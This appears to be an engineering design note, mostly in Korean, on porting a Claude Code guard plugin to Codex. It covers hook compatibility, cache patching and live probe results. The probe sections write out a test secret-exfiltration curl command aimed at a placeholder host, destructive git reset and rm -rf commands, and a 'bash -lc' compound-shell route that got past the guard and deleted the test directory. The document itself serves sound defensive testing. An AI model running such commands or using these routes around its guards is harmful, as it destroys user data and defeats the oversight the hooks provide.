# Codex guard compatibility

Issues: #262, #283

## Context

team-harness의 `harness-guard`는 Claude Code 훅·스킬을 1차 대상으로 설계됐다. Codex에서도 같은 repo 규약을
공유하려면 두 범위를 구분해야 한다.

- 공통 작업 계약: `AGENTS.md`, GitHub Issues, branch protection, CI.
- Claude Code 전용 장치: Claude hook payload/output 계약, `asyncRewake`, Claude plugin cache/log path.
- Codex 검토 대상: Codex hooks/config, sandbox/approval/rules, Codex plugin loader가 실제로 실행하는 hook 경로.

## Native Codex Capabilities

Codex에 보안·리뷰·훅 기능이 없다고 보면 안 된다. 2026-07-09 현재 설치본과 새로 받은 Codex manual 기준으로
다음이 확인됐다.

`codex features list`:

```text
guardian_approval                    stable             true
hooks                                stable             true
plugins                              stable             true
```

Codex manual은 Codex Security를 Codex용 security-review plugin으로 설명하고, 로컬 Codex thread에서 repository
scan과 code-change review를 수행하는 워크플로를 문서화한다. Auto-review도 별도 기능으로 존재하지만, 이는 권한
확대가 아니라 sandbox 경계에서 사람 승인 대신 별도 reviewer agent가 승인 요청을 검토하는 구조다.

2026-07-09 probe 당시 로컬 plugin 상태는 Codex native 보안 기능과 Claude plugin 호환 문제를 분리해서 봐야
함을 보여줬다.

```text
security-guidance@claude-plugins-official  installed, enabled  2.0.6
harness-guard@team-harness                 installed, enabled  0.35.2
codex-security@openai-curated              not installed
```

2026-07-10 05:41 KST에는 반복되는 invalid PostToolUse JSON 오류를 멈추기 위해 Codex 로컬 설정
(`~/.codex/config.toml`)에서 `security-guidance@claude-plugins-official`만 임시로 `enabled = false`로
바꿨고, `harness-guard@team-harness`는 `enabled = true`를 유지했다. 백업은
`/private/tmp/codex-config.backup.20260710054153.toml`에 있다.

이 임시 비활성화는 최종 상태가 아니다. 2026-07-10 후속 수정(v0.36.0)은
`plugins/harness-guard/scripts/codex-security-guidance-adapter.mjs`를 추가해 Claude
`security-guidance`가 내보내는 `metrics`/`rewakeSummary` 같은 Claude-only 필드를 Codex-safe 출력으로
정규화한다. 로컬 Codex 적용은
`plugins/harness-guard/scripts/patch-codex-security-guidance.mjs`가 수행한다: Codex의
`security-guidance@claude-plugins-official` 플러그인은 다시 `enabled = true`로 두고, 해당 플러그인의
Codex cache `hooks/hooks.json` command만 adapter 경유로 패치한다. Codex는 hook 정의의 현재 hash를 신뢰
상태로 기록하므로, command가 바뀐 뒤에는 새 hook hash를 `/hooks`에서 review/trust해야 실제 세션에서
실행된다. Claude Code 전역 설정은 바꾸지 않는다.

Codex 0.144.0은 Claude `type: "prompt"` hook을 아직 지원하지 않아 `harness-guard` 로드 때 해당 handler를
skip한다. v0.37.0의 `patch-codex-harness-guard.mjs`는 Codex local cache에서 그 unsupported handler만 제거하고,
구버전 cache의 YAML-invalid `argument-hint` scalar도 quote한다. `guard.sh`와 `route-intent.mjs` command hook은
그대로 유지하며, Claude가 읽는 원본 `hooks.json`과 SKILL source는 수정하지 않는다.

2026-07-10의 fresh `codex exec --ephemeral` (CLI 0.144.1) 반증 probe에서는 `unified_exec`가
`PreToolUse`를 발생시키지 않았다. `API_KEY=probe-secret curl -d "$API_KEY" https://example.invalid/collect`는
`UserPromptSubmit`만 거친 뒤 DNS 실패까지 실행됐다. Codex 공식 Hooks 문서도 `PreToolUse`가 현재 simple shell
호출만 intercept하며 `unified_exec` interception은 incomplete라고 명시한다. 그러므로 이 경로에서는
`harness-guard`의 command hook을 Claude와 동등한 secret-egress enforcement로 주장할 수 없다(#283).
후속 재검증에서 `codex exec`는 전역 `approval_policy = "untrusted"`와 달리 `approval: never`로 표시됐다.
따라서 non-interactive exec에 사람 승인 경계가 있다고 주장하지 않는다. v0.49.0 hardened CLI launcher는
`--disable unified_exec`를 주입하며, fresh ephemeral `pwd` probe에서 실제 `PreToolUse` 발화를 확인했다.
Desktop App과 launcher를 우회한 직접 실행은 이 보완을 받지 않는다.

Conclusion: Codex에서 보안 리뷰를 원하면 `security-guidance@claude-plugins-official`을 그대로 신뢰하지 말고
Codex Security plugin, Auto-review, sandbox/permissions/rules를 Codex native 경계로 검토해야 한다.
`security-guidance`의 현재 오류는 Codex 기능 부재가 아니라 Claude Code hook/output 계약을 Codex에 그대로 가져온
호환성 문제로 분류한다.

## Semantic Parity Matrix

이 표는 `harness-guard`가 소유한 각 surface의 정본이다. `Codex-native 대체`와
`운영 통제`는 Claude 계약을 그대로 실행할 수 없는 경우의 보장 수준을 나타낸다. 플랫폼이 필요한 hook event를
내보내지 않으면 같은 보호 결과를 주장하지 않고 `미지원+운영 통제`로 기록한다.

| 소유 surface | Claude Code 경로 | Codex 경로 | 상태 | 자동 검증 |
|---|---|---|---|---|
| `hooks/hooks.json:PreToolUse:Bash:command` | `guard.sh` | 같은 command hook | hardened CLI는 unified_exec 비활성화로 simple Bash interception 실측; Desktop/direct 실행 비보장 | `guard-test.sh`, `guard-matrix-test.sh`, fresh probe |
| `hooks/hooks.json:PreToolUse:Bash:prompt` | LLM secret-egress 판정 | explicit-pattern command hook | hardened CLI simple Bash에서 deterministic deny; Desktop/direct unified_exec 비보장 | `codex-secret-egress-guard-test.sh`, launcher test, fresh probe |
| `hooks/hooks.json:PreToolUse:Agent` | `enforce-subagent-model.py` | namespaced read-only Codex custom agents | Codex-native 대체 | `codex-skill-mapping-test.sh`, cache patch test |
| `hooks/hooks.json:UserPromptSubmit` | `route-intent.mjs` | 같은 command hook | 공통, cache patch 보존 | `route-intent-test.sh`, cache patch test |
| `scripts/codex-security-guidance-adapter.mjs` | Claude security-guidance raw output | Codex-safe output adapter | Codex-native 대체, PostToolUse 실측 | `codex-security-guidance-adapter-test.sh` |
| `scripts/patch-codex-security-guidance.mjs` | 해당 없음 | cache command patch + enable | Codex-native 설치 절차 | adapter patch test |
| `scripts/patch-codex-harness-guard.mjs` | 해당 없음 | unsupported prompt 제거 + YAML·실행 메타데이터·Claude attribution 보정 + agent 설치 | Codex-native 설치 절차 | `codex-harness-guard-patch-test.sh` |
| `scripts/sync-codex-plugin-cache.mjs` | 해당 없음 | source가 더 새로울 때 team-harness marketplace·plugin만 갱신 | Codex-native 설치 절차 | `codex-plugin-cache-sync-test.sh` |
| `scripts/codex-hardened.sh` | 해당 없음 | CLI 시작 전 plugin sync/cache patch 후 unified_exec 비활성화 | Codex 운영 통제 (cmux CLI만) | launcher + sync tests + fresh probe |
| `scripts/pr-create.sh` | skill이 호출 | 같은 wrapper | 공통 | `pr-create-test.sh` |
| `scripts/pr-merge.sh` | skill이 호출 | 같은 wrapper | 공통 | `pr-merge-auto-test.sh` |
| `scripts/solo-merge.sh` | skill이 호출 | 같은 wrapper | 공통 | `solo-merge-test.sh` |
| `skills/feature-add/SKILL.md` | slash skill + Claude tool prose | current agent write + explorer/verifier read-only roles | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/feature-merge/SKILL.md` | slash skill + Claude tool prose | `codex review` + same wrapper/GitHub gate | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/feature-modify/SKILL.md` | slash skill + Claude tool prose | current agent write + explorer/verifier read-only roles | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/hotfix/SKILL.md` | slash skill + Claude tool prose | current agent write + read-only evidence roles | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/loop/SKILL.md` | slash skill + Claude subagent prose | bounded current-agent loop + Codex automation boundary | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/milestone/SKILL.md` | slash skill + Claude tool prose | Codex `/goal` + GitHub milestone contract | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/plan/SKILL.md` | plan mode + slash skill | Codex `/plan` approval flow | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/pr-create/SKILL.md` | slash skill + wrapper | current agent + same wrapper | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/pr-review-gate/SKILL.md` | Claude code review | `codex review` + same GitHub gate | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/qa/SKILL.md` | slash skill + QA tools | explorer read-only QA checks + current-agent fixes | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/release-check/SKILL.md` | Claude subagent workflow | explorer/security/verifier read-only roles | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/release/SKILL.md` | slash skill + wrappers | current agent + read-only evidence roles | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/repo-sync/SKILL.md` | slash skill + node script | explorer read-only collection + current-agent action | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `skills/solo-merge/SKILL.md` | slash skill + wrapper | Codex review + same atomic wrapper | Codex-native mapping | `codex-skill-mapping-test.sh` |
| `agents/security-reviewer.md` | Claude named agent, `model: opus` | `codex/agents/harness-security-reviewer.toml` | Codex-native replacement | mapping + cache patch test |
| `agents/verifier.md` | Claude named agent, `model: opus` | `codex/agents/harness-verifier.toml` | Codex-native replacement | mapping + cache patch test |
| `codex/agents/harness-explorer.toml` | 해당 없음 | 부모 model 상속 + low, read-only evidence role | Codex-native | mapping + cache patch test |
| `codex/agents/harness-verifier.toml` | 해당 없음 | 부모 model 상속 + high, read-only verification role | Codex-native | mapping + cache patch test |
| `codex/agents/harness-security-reviewer.toml` | 해당 없음 | 부모 model 상속 + high, read-only security role | Codex-native | mapping + cache patch test |

`bash -lc` 등 compound shell은 `guard.sh` 단독으로 완전하게 해석하지 못한다. 이 항목은
Codex sandbox/approval과 server-side CI/branch protection이 최종 통제선이며, 아래 Live Probe의
반증 fixture로 계속 유지한다.

Codex의 대체 command hook은 **Codex가 `PreToolUse`를 실제로 발생시키는 simple Bash 호출에서만**
`curl`/`wget` upload, `nc` pipe, `scp`/`rsync` remote copy에 시크릿 source가 결합한 명백한 전송을 exit 2로
차단한다. LLM prompt와 달리 난독화·새 도구를 의미론적으로 추론하지 않는다. hardened CLI launcher는
`--disable unified_exec`로 이 hook이 발화하는 경로를 선택한다. Desktop/direct 실행의 unified_exec는 여전히
비보장이며 server-side CI/branch protection도 runtime egress를 대신 차단하지 않는다. 로컬 `.env` 읽기나 일반
네트워크 요청을 이 훅이 차단해서는 안 된다.

Codex CLI runtime은 Claude-style `tool_input.command` 대신 `tool_input.cmd`를 전달할 수 있다. replacement
guard는 hook matcher가 이미 Bash 실행을 한정하므로 tool name을 다시 판정하지 않고 두 필드를 모두 검사한다.
`codex-secret-egress-guard-test.sh`는 Claude-shaped payload와 Codex exec-shaped payload를 함께 고정한다.

## Codex Cache Refresh Runbook

`harness-guard` cache가 새 버전으로 갱신된 뒤에는 아래 순서로 적용한다.

1. `~/.codex/config.toml`의 `approval_policy = "untrusted"`를 interactive 세션용으로 유지한다. `codex exec`는
   0.144.1 probe에서 `approval: never`였으므로 이 설정이 non-interactive 승인 경계를 보장한다고 주장하지 않는다.
   `sandbox_workspace_write.network_access = false`만으로 egress를 막는다고도 주장하지 않는다.
2. Codex에 `harness-guard` **v0.47.0 이상**을 설치/갱신한다. patcher는 cache에
   `scripts/codex-secret-egress-guard.mjs`가 없으면 중단한다. 구버전 cache를 억지로 patch하지 않는다.
3. `node plugins/harness-guard/scripts/patch-codex-harness-guard.mjs`를 실행한다. 이 명령은 Claude
   source/cache를 바꾸지 않고 Codex cache의 Claude `prompt` handler를 Codex command handler로 교체하고,
   Claude 실행 메타데이터와 공동작성 표기를 Codex cache skill에서만 제거하며, `harness-*` custom agent를
   `~/.codex/agents/`에 설치한다.
4. `/hooks`에서 새 command hash를 review/trust한다.
5. hardened launcher로 새 Codex session을 시작하고 hook event 로그를 확인한다. CLI 0.144.1에서
   `--disable unified_exec`를 준 `pwd` probe는 `PreToolUse`를 발생시켰다. 실제 시크릿이나 실제 전송 endpoint는
   사용하지 않는다. launcher를 우회한 unified_exec 경로에는 이 보장을 확장하지 않는다.
6. 새 session의 `/subagents`에서 `harness-explorer`, `harness-verifier`,
   `harness-security-reviewer`가 발견되는지 확인한다. 새 agent 파일은 hook이 아니므로 `/hooks` trust 대상이
   아니다. 사용자 전역 default model은 변경하지 않는다.

`security-guidance` patch도 별도다. Codex는 startup/cache refresh 때 marketplace snapshot의 raw Claude hook을
cache에 다시 복사할 수 있으므로, v0.43.0 이상의
`node plugins/harness-guard/scripts/patch-codex-security-guidance.mjs`는 **실행 cache와 Codex local marketplace
snapshot 둘 다** adapter command로 보정한다. marketplace upgrade 뒤에 이 명령을 실행하고 `/hooks` hash를 trust한다.

### CLI 자동 복구 launcher

cmux에서 시작하는 Codex CLI는 `scripts/codex-hardened.sh`를 사용한다. 이 launcher는 시작 직전에
source manifest가 설치 cache보다 새로울 때만 공식 Codex CLI로 `team-harness` marketplace와
`harness-guard` plugin을 갱신한다. 이어서 harness cache patch와 `security-guidance` adapter patch를 순서대로
적용하며, 동기화나 patch 중 하나라도 실패하면 Codex를 실행하지 않는다. 버전이 같거나 cache가 더 새로우면
marketplace 네트워크 호출을 생략한다. `approval_policy = "untrusted"`는 변경하지 않는다.

현재 checkout을 최신 `develop`으로 갱신한 뒤, zsh에서 다음 alias를 명시적으로 설치할 수 있다.

```zsh
alias codex='bash /Users/grinvi04/team-harness/scripts/codex-hardened.sh'
```

영구 설치는 `.zshrc`에 같은 alias를 넣고 새 shell을 열어 확인한다. 제거하려면 해당 alias 한 줄만 지운다.
Desktop App을 CLI보다 먼저 직접 시작하는 경우에는 이 launcher가 실행되지 않으므로, 앱의 cache 자동 복구는 보장하지
않는다.

## Custom Agent Validation Status

2026-07-10에는 세 agent를 `gpt-5.6-terra`/medium으로 고정했으나 이는 당시 계정 표본을 플러그인 계약으로
일반화한 오류였다. Codex 공식 custom-agent 계약은 생략한 `model`이 부모 session을 상속한다고 명시한다.
2026-07-12부터 model slug를 제거하고 explorer=low, verifier/security=high reasoning만 역할별로 지정한다.
사용자 플랜이 지원하는 실제 model은 부모 `/model` 선택이 결정한다.

quota 복구 뒤 새 저장형 Codex session에서 `harness-verifier`를 명시 spawn해 `AGENTS.md:31`의
main/develop 직접 commit/push 금지 규칙을 read-only로 정확히 반환하는 것을 확인했다. `--ephemeral`은
subagent thread를 만들 수 없어 probe 대상이 아니다. 구조·설치 회귀는 `codex-skill-mapping-test.sh`와
`codex-harness-guard-patch-test.sh`가 계속 보장한다.

## Codex Security Evaluation

2026-07-10에 `codex-security@openai-curated` v0.1.11을 설치해 native `security-diff-scan`을 실행했다.
대상은 v0.40.0..v0.41.0의 Codex PreToolUse wrapper 변경이며, scan artifact는 로컬
`/private/tmp/team-harness-security-264`에만 작성했다. repository 파일은 변경하지 않았다.

- 결과: source-like worklist 3개 complete, reportable finding 0개.
- 근거: `report.md`, `findings.json`, `coverage.json`, SARIF artifact. 위 artifact는 로컬 평가 증거이며
  repo의 영구 상태 저장소는 아니다.
- 결론: Codex Security는 Claude `security-reviewer`를 **대체하지 않고 보완**하는 Codex-native,
  수동/PR diff security review 경로로 채택한다.
- 한계: 이번 평가는 v0.40.0..v0.41.0 diff scan이며 전체 repository scan 또는 runtime network policy
  enforcement을 의미하지 않는다. `security-guidance` adapter, Codex sandbox/approval, branch protection/CI는
  계속 각각의 역할을 유지한다.

## Live Probe Results

2026-07-09 현재 Codex 세션에서 throwaway clone을 만들어 직접 실행했다. 아래 결과는 문서 추정이 아니라 실제
실행 출력 기준이다.

### Direct destructive commands

`git reset --hard`:

```text
Command blocked by PreToolUse hook: ⛔ [guard] git reset --hard 금지 — 미커밋 변경사항 전체 삭제 위험
해결: 필요한 경우 사용자가 직접 실행 (Claude가 대신 실행하지 않음). Command: git reset --hard
```

Result: blocked.

`rm -rf tests`:

```text
Command blocked by PreToolUse hook: ⛔ [guard] 검증기(테스트/마이그레이션) 삭제 금지 — 게이트 무력화 방지
해결: 정 필요하면 사용자가 직접 실행하세요 (Claude가 대신 삭제하지 않음). Command: rm -rf tests
```

Result: blocked.

### Wrapper prefixes

The following forms were blocked in the active Codex plugin-hook path:

- `env git reset --hard`
- `/usr/bin/time git reset --hard`
- `sudo -n git reset --hard`
- `env rm -rf tests`
- `/usr/bin/time rm -rf tests`
- `sudo -n rm -rf tests`

The guard message preserved the original wrapper in the trailing `Command:` field.

### Compound shell hole

This command passed:

```bash
bash -lc "git status --short && rm -rf tests"
```

The command exited `0` with no guard block. Follow-up checks in the throwaway clone showed:

```text
tests-missing
 D tests/activerecord-destructive-ddl-test.sh
 D tests/alembic-destructive-ddl-test.sh
 D tests/alembic-heads-test.sh
```

Result: passed, and deleted `tests/`. This is the concrete category(b) local destruction porosity point.

## Codex Config Hook Probe

A temporary user config hook was injected into `~/.codex/config.toml` and then restored from backup. `hooks/list` in a separate
app-server session could see the hook, but the already-running Codex session did not hot-load or execute it for the current tool
path. A marker command executed normally and the hook payload file was not created:

```text
CODEX_CONFIG_PROBE_BLOCK
payload-missing
```

Conclusion: do not treat a config edit in an already-running Codex session as proof that `[hooks]` is active for that session.
Fresh-session validation is required for user config hooks.

## PostToolUse and Stop Hook Mismatch

터미널에서 다음 오류가 반복됐다.

```text
PostToolUse hook (failed)
  error: hook returned invalid post-tool-use JSON output
```

The active hook source was:

```text
/Users/grinvi04/.codex/plugins/cache/claude-plugins-official/security-guidance/2.0.6/hooks/hooks.json
```

That hook uses Claude Code fields and output assumptions:

- `asyncRewake`
- `rewakeMessage`
- `rewakeSummary`
- Claude `SyncHookJSONOutput`
- Stop-path `decision:"block"` / `reason`
- PostToolUse-path `hookSpecificOutput.additionalContext`

The installed Codex app-server schema for configured command hooks exposes `type`, `command`, `async`, `timeoutSec`,
`statusMessage`, and `commandWindows`. It does not establish that the Claude Code async rewake contract is valid in Codex.
The current Codex manual also states that `async` command hooks are parsed but not supported, and such handlers are skipped.

The Claude plugin source is explicit about its target contract:

```text
Write a SyncHookJSONOutput line to stdout for Claude Code to pick up.
```

For PostToolUse guidance, the same source emits:

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PostToolUse",
    "additionalContext": "..."
  }
}
```

Conclusion: Claude-only PostToolUse/Stop hooks should not be loaded raw in Codex. They must be wrapped by a Codex-specific
adapter that preserves guidance while removing unsupported Claude-only fields. In Codex,
`security-guidance@claude-plugins-official` and `codex-security@openai-curated` remain different options with different
contracts.

## Proposed Boundary

Use `guard.sh` in Codex as a best-effort policy hint for simple shell tool invocations, not as the final category(b) safety
boundary.

Category(b) local destruction protection should be enforced by Codex sandbox/approval/rules where possible:

- keep filesystem sandboxing on (`workspace-write` rather than full access);
- require approval for commands that can delete, reset, overwrite, or alter guard/test/migration paths;
- treat `bash -lc`, `sh -c`, `zsh -lc`, and similar shell wrappers as high-risk because the destructive action may be hidden
  inside a compound string;
- keep server-side branch protection and CI as the non-local enforcement layer.

## Acceptance Criteria

- Preserve the `bash -lc "... && rm -rf tests"` and `unified_exec` secret-egress findings as documented unsupported
  holes until Codex exposes complete PreToolUse interception.
- Decide whether Codex should load `harness-guard` through plugin `hooks.json`, user config `[hooks]`, or both.
- Map Codex hook payload and block semantics with fresh-session tests before changing `guard.sh`.
- Adapt Claude-only PostToolUse/Stop hooks in Codex instead of disabling `security-guidance`.
- Decide whether to install and evaluate `codex-security@openai-curated` for Codex-native security scans/reviews.
- Keep project state, decisions, backlog, and domain knowledge out of tool-local AI memory; record follow-up decisions in
  GitHub Issues, PRs, and `docs/decisions.md`.
